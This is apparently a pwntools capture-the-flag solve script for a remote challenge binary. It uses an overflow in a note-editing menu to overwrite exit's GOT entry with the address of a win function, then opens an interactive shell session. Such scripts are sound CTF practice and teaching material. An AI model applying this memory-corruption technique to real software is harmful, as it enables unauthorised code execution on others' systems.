from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ["/usr/bin/gnome-terminal", "--"]

elf = ELF("./main")

io = process("./main")
io = remote("challs.tfcctf.com", 31120)
io.clean()

def add(index, content):
    io.sendline(b"1")
    io.clean()
    io.sendline(str(index).encode())
    io.clean()
    io.sendline(content)

def edit(index, content):
    io.sendline(b"2")
    io.clean()
    io.sendline(str(index).encode())
    io.clean()
    io.sendline(content)

def view():
    io.sendline(b"3")

add(0, b"AAAA")
add(1, b"BBBB")
edit(0, b"A" * 32 + p64(elf.got.exit))
edit(1, p64(elf.sym.win))
io.sendline(b"0")

io.interactive()
